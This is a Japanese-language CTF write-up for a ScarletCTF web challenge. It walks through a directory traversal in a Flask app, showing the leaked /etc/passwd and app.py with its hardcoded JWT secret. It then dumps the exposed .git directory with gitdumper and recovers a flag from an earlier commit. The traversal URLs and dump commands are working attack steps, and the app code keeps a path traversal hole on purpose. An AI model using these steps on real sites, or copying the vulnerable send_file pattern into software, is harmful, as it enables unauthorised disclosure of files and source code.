---
title: 'SWEInternAtGirlyPopInc - ScarletCTF'
description: 'SWE intern at girly pop incのWriteupです。'
pubDate: 2026-01-12
category: 'CTF'
tags: ['ScarletCTF', 'Writeup', 'Web', 'Git', 'DirTraversal']
---

# SWEInternAtGirlyPopInc - ScarletCTF

## 初期調査
ディレクトリトラバーサルがありそう
```bash
https://challenge-host/view?page=../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
Flaskのアプリだから`main.py` `app.py` `run.py`などがありそう
```bash
# ../app.py

from flask import Flask, request, render_template, send_file
import jwt
import datetime
import os
# commment for testing
app = Flask(__name__)
app.config['SECRET_KEY'] = 'f0und_my_k3y_1_gu3$$'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    username = request.form.get('username', 'guest')
    payload = {
        'user': username,
        'iat': datetime.datetime.utcnow(),
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30),
        'role': 'standard_user'
    }
    token = jwt.encode(payload, app.config['SECRET_KEY'], algorithm="HS256")
    return render_template('index.html', token=token)

@app.route('/view')
def view():

    page = request.args.get('page')
    if not page:
        return "Missing 'page' parameter", 400
    base_dir = os.path.dirname(os.path.abspath(__file__))
    target_path = os.path.abspath(os.path.join(base_dir, 'static', page))

    try:
        file_path = os.path.join('static', page)
        return send_file(file_path)
    except Exception:
        return "File not found or access denied.", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
JWTを使ってアクセスする場所があるか探すが特に見当たらない
```bash
dirsearch -u https://girly.ctf.rusec.club/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /reports/https_girly.ctf.rusec.club/__26-01-12_21-36-36.txt

Target: https://girly.ctf.rusec.club/

[21:36:36] Starting:

Task Completed
```
## 別の場所を探る
about.htmlの`Deployment: Automated via Git-Hooks`  
ディレクトリトラバーサルで.gitが取れるかも
```bash
# ../.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = intern-3
```
gitdumpツールを使ってディレクトリごと取得  
[GitTools](https://github.com/internetwache/GitTools.git)
```
./gitdumper.sh https://girly.ctf.rusec.club/view?page=../.git/ ./dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./dumped_repo/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/9e/26820af5010a2afa8e4c09023c1ee078e8e8aa
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/7d/568bcf0d6139bb8738949561210f592902a4c9
[+] Downloaded: objects/b0/e7b939b4a9c8cfda2e3102d301d7530aaa4f0f
[+] Downloaded: objects/09/c4afd9466a0638b4301cfe5eae1567afef08d5
[+] Downloaded: objects/85/5fb1bc5463bfe6c10bae6000f8ffae2056e652
[+] Downloaded: objects/62/87dd182773704dec4ebb5f74851c23e5315393
[+] Downloaded: objects/7a/b932aa4bfde57034a6ed2a9a8579284a44964e
[+] Downloaded: objects/6c/90aa308cfdb288a03b5815785cf6f13ff226bc
[+] Downloaded: objects/34/5793b0651d5aa59283dc0149e18fb7b0d0e7ba
[+] Downloaded: objects/61/f9cd8f2e1d3afd8dace27cac0eff1f88e8d463
[+] Downloaded: objects/8f/a2e7a7d6ef91852428429192f769685e309922
[+] Downloaded: objects/fc/658d72a54803cb044238f5bca7450fb67b9645
[+] Downloaded: objects/21/fb228fad11b8a8a4f42dc3c5e77b882c264f7e
```
```bash
dump > git ls-tree -r HEAD
100644 blob 855fb1bc5463bfe6c10bae6000f8ffae2056e652	Dockerfile
100644 blob 6287dd182773704dec4ebb5f74851c23e5315393	app.py
100644 blob 7ab932aa4bfde57034a6ed2a9a8579284a44964e	requirements.txt
100644 blob 8fa2e7a7d6ef91852428429192f769685e309922	static/about.html
100644 blob fc658d72a54803cb044238f5bca7450fb67b9645	static/docs.html
100644 blob 21fb228fad11b8a8a4f42dc3c5e77b882c264f7e	templates/index.html

dump > git log --oneline --all
9e26820 (HEAD -> master) removed flag
7d568bc initial

dump > git ls-tree -r 7d568bc
100644 blob 855fb1bc5463bfe6c10bae6000f8ffae2056e652	Dockerfile
100644 blob 6287dd182773704dec4ebb5f74851c23e5315393	app.py
100644 blob 61f9cd8f2e1d3afd8dace27cac0eff1f88e8d463	flag.txt
100644 blob 7ab932aa4bfde57034a6ed2a9a8579284a44964e	requirements.txt
100644 blob 8fa2e7a7d6ef91852428429192f769685e309922	static/about.html
100644 blob fc658d72a54803cb044238f5bca7450fb67b9645	static/docs.html
100644 blob 21fb228fad11b8a8a4f42dc3c5e77b882c264f7e	templates/index.html

dump > git show 7d568bc:flag.txt
RUSEC{***}
```